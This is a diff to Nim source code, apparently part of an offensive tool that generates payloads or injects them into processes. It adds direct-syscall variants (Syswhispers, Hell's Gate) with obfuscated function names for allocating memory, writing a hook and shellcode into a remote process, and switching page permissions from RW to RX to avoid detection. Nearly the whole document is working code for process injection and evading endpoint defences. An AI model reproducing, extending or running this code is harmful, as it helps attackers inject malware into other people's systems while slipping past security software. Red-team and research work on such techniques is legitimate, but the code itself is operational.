@@ -2953,6 +2953,7 @@ let NotepadProcIDStub * = fmt"""
                 copyMem(&trampoline[1] , &tempjumpaddr, 3)
             
             var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
+            var protectionLength: SIZE_T = cast[SIZE_T](len(trampoline))
             var dwordSize: DWORD = DWORD(len(trampoline))
             var dwOldProtect: DWORD = 0
             var output: bool = false
@@ -2967,12 +2968,32 @@ let NotepadProcIDStub * = fmt"""
                 copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
             
             var protectAddress: LPVOID = addressToHook
+            
+            when defined(Syswhispers):
+                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
-            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
+                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
 
             if (status == STATUS_SUCCESS):
-                echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
-                status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
+                when defined(verbose):
+                    echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
+                
+                when defined(Syswhispers):
+                    status = oqiazasusjk(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
+                else:
+                    when defined(Hellsgate):
+                        if getSyscall(ntWriteTable):
+                            syscall = ntWriteTable.wSysCall
+                        else:
+                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+                    status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
                 if (status == 0):
                     echo obf("[+] NtWriteVirtualMemory - hook set.")
                     output = true
@@ -2984,7 +3005,16 @@ let NotepadProcIDStub * = fmt"""
                 output = false
             
             protectAddress = addressToHook
-            status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
+            when defined(Syswhispers):
+                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr protectionLength,PAGE_EXECUTE_READ,addr dwOldProtect)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
             
             if(status != STATUS_SUCCESS):
                 echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
@@ -3235,11 +3265,20 @@ let NotepadProcIDStub * = fmt"""
             var rPtr: LPVOID
             var status: NTSTATUS
             var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+            
+            when defined(Syswhispers):
+                status = oqiahsjynmxkla(tProcess, &rPtr, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntAllocTable):
+                        syscall = ntAllocTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
-            status = NtAllocateVirtualMemory(
-                tProcess, &rPtr, 0, &sc_size, 
-                MEM_COMMIT, 
-                PAGE_EXECUTE_READWRITE);
+                status = NtAllocateVirtualMemory(
+                    tProcess, &rPtr, 0, &sc_size, 
+                    MEM_COMMIT, 
+                    PAGE_READWRITE);
 
             when defined(verbose):
                 if(status == 0):
@@ -3305,13 +3344,21 @@ let NotepadProcIDStub * = fmt"""
 
             # Finally write the shellcode into the remote process
             var bytesWritten: SIZE_T
-
-            status = NtWriteVirtualMemory(
-                    tProcess, 
-                    rPtr, 
-                    unsafeAddr hookShellcodeBytes[0], 
-                    sc_size-1, 
-                    addr bytesWritten);
+            
+            when defined(Syswhispers):
+                status = oqiazasusjk(tProcess, rPtr, unsafeAddr hookShellcodeBytes[0], sc_size-1, addr bytesWritten)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntWriteTable):
+                        syscall = ntWriteTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                status = NtWriteVirtualMemory(
+                        tProcess, 
+                        rPtr, 
+                        unsafeAddr hookShellcodeBytes[0], 
+                        sc_size-1, 
+                        addr bytesWritten);
 
             when defined(verbose):
                 if (status == 0):
@@ -3321,6 +3368,28 @@ let NotepadProcIDStub * = fmt"""
                 else:
                     echo obf("[-] NtWriteVirtualMemory failed!")
                     quit(1)
+            
+            # re-protect memory to RX
+            
+            var protectRXAddress: LPVOID = rPtr
+            var rxOldProtect: DWORD = 0
+            when defined(Syswhispers):
+                status = uashdiasdj(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)
+            else:                
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                status = NtProtectVirtualMemory(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)
+
+            if(status == 0):
+                when defined(verbose):
+                    echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
+            else:
+                when defined(verbose):
+                    echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
+                quit(1)
     when defined(ruylopez):
         when defined(localinject):
             if(not amISpawned()):
